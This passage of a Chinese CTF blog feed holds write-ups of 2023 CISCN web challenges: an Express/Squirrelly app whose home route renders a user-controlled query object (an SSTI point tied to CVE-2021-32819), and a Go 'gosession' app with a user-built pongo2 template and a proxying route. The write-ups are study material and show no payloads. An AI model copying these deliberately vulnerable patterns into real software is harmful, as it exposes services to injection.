<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> squirrelly = <span class="built_in">require</span>(<span class="string">&#x27;squirrelly&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> indexRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> usersRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/users&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;squirrelly&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// start session</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;thejs.session&#x27;</span>,</span><br><span class="line">  <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;Ye0h&#x27;</span>, <span class="number">16</span>),</span><br><span class="line"><span class="comment">//randomize的第一个参数是生成的字符串的长度，第二个参数是生成的字符串的字符范围</span></span><br><span class="line"><span class="comment">//randomize的作用是生成一个随机的字符串，用于加密session</span></span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/users&#x27;</span>, usersRouter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">  <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Listening on http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问，发现是一个login页面</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230701223652900.png"><img src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230701223652900.png" alt="image-20230701223652900"></a></p>
<p>点击登录，跳转到Register页面</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703231445526.png"><img src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703231445526.png" alt="image-20230703231445526"></a></p>
<p>但是注册报错，看看<code>users.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// init database</span></span><br><span class="line"><span class="keyword">var</span> connection  = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>:<span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">user</span>:<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>:<span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span>:<span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>发现有个初始化数据库，再看看列名和数据表名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">var</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username !== <span class="literal">undefined</span> &amp;&amp; password !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> querySql = <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line">      connection.<span class="title function_">query</span>(querySql, [username], <span class="keyword">function</span>(<span class="params">err, result</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;Error!&#x27;</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result))[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result &amp;&amp; result.<span class="property">username</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;User already exists.&#x27;</span> </span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> insertSql = <span class="string">&quot;insert into users (`username`, `password`) value (?, ?)&quot;</span>;</span><br><span class="line">          connection.<span class="title function_">query</span>(insertSql, [username, utils.<span class="title function_">md5</span>(password)], <span class="keyword">function</span>(<span class="params">err, result</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(err) &#123;</span><br><span class="line">              <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">                <span class="attr">message</span>: <span class="string">&#x27;Error!&#x27;</span> </span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; </span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;Register successed.&#x27;</span> </span><br><span class="line">          &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>于是构建该数据库和对应表和列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> database ctf;</span><br><span class="line">use ctf;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">  id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703232247545.png"><img src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703232247545.png" alt="image-20230703232247545"></a></p>
<p>注册成功，进行登录</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703232345400.png"><img src="/2023CISCN%E5%8D%8E%E5%8D%97/image-20230703232345400.png" alt="image-20230703232345400"></a></p>
<hr>
<p>查看代码，分析题目，发现是<code>Squirrel</code>是一个模板引擎，所以猜测改代码中存在<code>ssti</code>，或者<code>XSS</code>，或者<code>RCE</code></p>
<p>但是考虑到比赛不出网，所以先自己寻找注入点</p>
<p>下面是两篇参考文章，</p>
<blockquote>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32819">NVD - CVE-2021-32819 (nist.gov)</a></p>
<p><a href="https://www.freebuf.com/vuls/276112.html">漏洞分析：CVE-2021-32819 - FreeBuf网络安全行业门户</a></p>
</blockquote>
<p>因为是<code>js</code>，所以查看<code>res.render</code>存在的地方，寻找可以控制的参数</p>
<p>发现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userID</span> === <span class="literal">undefined</span> || req.<span class="property">session</span>.<span class="property">userID</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/users/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!utils.<span class="title function_">isSafeObj</span>(req.<span class="property">query</span>.<span class="property">information</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123; <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">userID</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, req.<span class="property">query</span>.<span class="property">information</span>)</span><br><span class="line">      <span class="comment">//这里的req.query.information是一个对象，所以可以直接传入</span></span><br><span class="line">      <span class="comment">//模板是home.squirrelly</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>最后一行中，<code>req.query.information</code>是可控的，而且是将其直接进行渲染，所以这里尝试修改<code>GET</code>发送<code>information</code>参数进行<code>ssti</code>注入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, req.<span class="property">query</span>.<span class="property">information</span>)</span><br></pre></td></tr></table></figure>

<p>而渲染模板<code>home</code>，就是<code>home.squirrelly</code>，是<code>squirrel</code>特有的模板文件格式</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;home-content&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/images/avatar.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Avatar&quot;</span> <span class="attr">class</span>=<span class="string">&quot;avatar&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;username&quot;</span>&gt;</span>&#123;&#123; it.username &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;timestamp&quot;</span>&gt;</span>Current Time: <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;current-time&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Update current time</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">updateCurrentTime</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> currentTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toLocaleString</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;current-time&#x27;</span>).<span class="property">textContent</span> = currentTime;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Update current time every second</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setInterval</span>(updateCurrentTime, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&#123;&#123; it.username &#125;&#125;</code>，这里就是下面代码传入的动态渲染参数，是登录后显示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!utils.<span class="title function_">isSafeObj</span>(req.<span class="property">query</span>.<span class="property">information</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123; <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">userID</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, req.<span class="property">query</span>.<span class="property">information</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>2023CISCN初赛</title>
    <url>/2023CISCN%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<p><code>2023国赛web记录，学到很多，感觉原题也挺多，但是改的挺好</code></p>
<span id="more"></span>

<h1 id="gosession"><a href="#gosession" class="headerlink" title="gosession"></a>gosession</h1><blockquote>
<p>题目内容：<br>ctfer按照官方文档的模板编写了代码，但是好像哪里出了问题。</p>
</blockquote>
<p>附件两个文件，一个<code>route.go</code>，一个<code>main.go</code></p>
<p><code>main.go</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看到三个路由</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>/</code></p>
<p><code>/admin</code></p>
<p><code>/flask</code></p>
</blockquote>
<h2 id="route-go"><a href="#route-go" class="headerlink" title="route.go"></a><code>route.go</code></h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">   <span class="string">&quot;html&quot;</span></span><br><span class="line">   <span class="string">&quot;io&quot;</span></span><br><span class="line">   <span class="string">&quot;net/http&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">      err = session.Save(c.Request, c.Writer)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">      http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">   xssWaf := html.EscapeString(name)</span><br><span class="line">   tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">   body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看<code>route.php</code>中对每个路由代码，分析写在注释</p>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a><code>Index</code></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义了一个store的全局变量，用于存储session，session生成用到环境变量SESSION_KEY</span></span><br><span class="line"><span class="comment">//os.Getenv是获取环境变量的函数</span></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//store.Get()从HTTP请求c.Request中读取session-name</span></span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">    <span class="comment">//如果获取session-name的过程中出现错误，该错误将会被赋值给变量err，并响应码500</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//如果接收的session会话中没有name属性，就会给name赋值guest</span></span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">      err = session.Save(c.Request, c.Writer)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//响应码200，打印 Hello, guest</span></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a><code>Admin</code></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//  同Index</span></span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  检查session中name是否是admin，若不是，返回服务器异常500，并且显示NO</span></span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">      http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  查询c中参数name，若不存在默认参数ssti</span></span><br><span class="line">   name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  html.EscapeString()转义 &lt; , &gt; , &amp; , &#x27; , &quot; 这五个html特殊字符</span></span><br><span class="line">   xssWaf := html.EscapeString(name)</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//使用 pongo2.FromString从字符串中创建一个pongo2模板实例，将&quot;Hello &quot; + xssWaf + &quot;!&quot;传入模板字符串tpl中</span></span><br><span class="line">   tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//  Execute定义模块执行时的上下字符串，该函数会将模板中的变量替换为对应的值，并将结果作为一个字符串返回。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  pongo2.Context&#123;&quot;c&quot;: c&#125;将参数c放在模板中，方便调用http请求中的一些数据</span></span><br><span class="line">    <span class="comment">//这里相当于赋值如&#123;&#123; title &#125;&#125;，这里进行&#123;&quot;title&quot;: &quot;welcome&quot;&#125;，</span></span><br><span class="line">    <span class="comment">//这样动态显示页面中&#123;&#123; title &#125;&#125;就是welcome，而本段代码就是c的内容</span></span><br><span class="line">   out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//  响应码200，返回打印out参数，也就是c参数</span></span><br><span class="line">   c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a><code>Flask</code></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//同上</span></span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//同上，检查有无name这个键值</span></span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, 